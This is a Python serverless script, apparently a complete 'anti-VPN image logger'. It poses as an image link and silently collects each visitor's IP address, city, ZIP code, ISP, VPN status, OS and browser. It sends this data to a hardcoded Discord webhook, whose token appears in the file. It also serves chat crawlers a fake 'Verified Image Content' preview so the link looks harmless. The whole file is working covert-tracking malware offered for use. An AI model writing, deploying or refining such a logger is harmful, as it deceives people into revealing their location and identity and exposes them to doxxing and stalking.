# ==============================================================================
#  _    _  ____  _      __     __  _____ __     __  _____  _______  ______  __  __ 
# | |  | |/ __ \| |     \ \   / / / ____|\ \   / / / ____||__   __||  ____||  \/  |
# | |__| | |  | | |      \ \_/ / | (___   \ \_/ / | (___     | |   | |__   | \  / |
# |  __  | |  | | |       \   /   \___ \   \   /   \___ \    | |   |  __|  | |\/| |
# | |  | | |__| | |____    | |    ____) |   | |    ____) |   | |   | |____ | |  | |
# |_|  |_|\____/|______|   |_|   |_____/    |_|   |_____/    |_|   |______||_|  |_|
# ==============================================================================
# HOLY SYSTEM v5.0 - THE ULTIMATE ANTI-VPN IMAGE LOGGER
# Optimized for: https://your-project.vercel.app/api/main.py
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
import os
import time
import traceback

# --- GLOBAL SETTINGS & CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"
BOT_USERNAME = "Holy Anti-VPN Global"
EMBED_COLOR = 0x00FFFF
VPN_COLOR = 0xFF0000

class handler(BaseHTTPRequestHandler):

    def get_geolocation(self, ip_address):
        """ Fetch detailed information about the IP address from external API. """
        try:
            # We request 16976857 to get status, country, regionName, city, zip, lat, lon, isp, org, as, proxy, hosting, query
            api_endpoint = f"http://ip-api.com/json/{ip_address}?fields=16976857"
            response = requests.get(api_endpoint, timeout=10)
            if response.status_code == 200:
                return response.json()
            else:
                return None
        except Exception as e:
            print(f"[!] Error fetching GeoIP: {e}")
            return None

    def send_to_webhook(self, log_data):
        """ Construct and send a professional Discord Embed. """
        try:
            is_vpn = log_data.get('proxy', False) or log_data.get('hosting', False)
            
            # Detailed Fields for the Discord Embed
            fields = [
                {
                    "name": "📍 Geographical Location",
                    "value": f"**Country:** {log_data.get('country', 'Unknown')}\n**Region:** {log_data.get('regionName', 'Unknown')}\n**City:** {log_data.get('city', 'Unknown')}\n**Zip:** {log_data.get('zip', 'Unknown')}",
                    "inline": False
                },
                {
                    "name": "🌐 Network & Infrastructure",
                    "value": f"**IP:** `{log_data.get('query', 'Unknown')}`\n**ISP:** {log_data.get('isp', 'Unknown')}\n**ASN:** {log_data.get('as', 'Unknown')}",
                    "inline": True
                },
                {
                    "name": "🛡️ Security Status",
                    "value": f"**VPN/Proxy:** {'⚠️ DETECTED' if is_vpn else '✅ CLEAN'}\n**Hosting:** {'⚠️ YES' if log_data.get('hosting') else '✅ NO'}\n**Mobile:** {'📱 YES' if log_data.get('mobile') else '💻 NO'}",
                    "inline": True
                },
                {
                    "name": "💻 System Information",
                    "value": f"**OS:** `{log_data.get('os_name', 'Unknown')}`\n**Browser:** `{log_data.get('browser_name', 'Unknown')}`",
                    "inline": False
                },
                {
                    "name": "🔗 Target Metadata",
                    "value": f"**User-Agent:** ```{log_data.get('user_agent', 'N/A')}```",
                    "inline": False
                }
            ]

            payload = {
                "username": BOT_USERNAME,
                "avatar_url": REDIRECT_IMAGE,
                "embeds": [{
                    "title": "🔍 NEW INCOMING CONNECTION DETECTED" if not log_data.get('is_bot') else "🤖 DISCORD CRAWLER PREVIEW",
                    "description": "A visitor has interacted with the tracking link. Detailed analysis below:",
                    "color": VPN_COLOR if is_vpn else EMBED_COLOR,
                    "fields": fields,
                    "footer": {
                        "text": f"Holy System Engine • {time.strftime('%Y-%m-%d %H:%M:%S')}",
                        "icon_url": "https://i.imgur.com/v8p77vI.png"
                    },
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ')
                }]
            }

            requests.post(WEBHOOK_URL, json=payload)
        except Exception as e:
            print(f"[!] Webhook delivery error: {e}")

    def do_GET(self):
        """ Handle incoming HTTP GET requests. """
        try:
            # Step 1: Extract real IP (handling Vercel proxy headers)
            real_ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Step 2: Bot / Crawler detection
            is_bot = any(bot_id in user_agent for bot_id in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "Mediapartners-Google"])

            # Step 3: Fetch Data & Log
            geo_data = self.get_geolocation(real_ip)
            if geo_data:
                # Add device info to data dictionary
                os_detect, browser_detect = httpagentparser.simple_detect(user_agent)
                geo_data['os_name'] = os_detect
                geo_data['browser_name'] = browser_detect
                geo_data['user_agent'] = user_agent
                geo_data['is_bot'] = is_bot
                
                # Execute logging
                self.send_to_webhook(geo_data)

            # Step 4: Response Logic
            if is_bot:
                # Send Meta Tags to Discord Bot to generate an image preview
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html_preview = f"""
                <!DOCTYPE html>
                <html>
                <head>
                    <meta property="og:title" content="Verified Image Content">
                    <meta property="og:description" content="Secure Image Preview">
                    <meta property="og:image" content="{REDIRECT_IMAGE}">
                    <meta property="og:type" content="website">
                    <meta name="twitter:card" content="summary_large_image">
                    <meta name="twitter:image" content="{REDIRECT_IMAGE}">
                    <title>Image Loading...</title>
                </head>
                <body>
                    <p>Processing image, please wait...</p>
                </body>
                </html>
                """
                self.wfile.write(html_preview.encode('utf-8'))
            else:
                # Send the real human to the actual image via 302 redirect
                self.send_response(302)
                self.send_header('Location', REDIRECT_IMAGE)
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Pragma', 'no-cache')
                self.send_header('Expires', '0')
                self.end_headers()

        except Exception:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(traceback.format_exc().encode('utf-8'))

# Export the handler for Vercel
app = handler
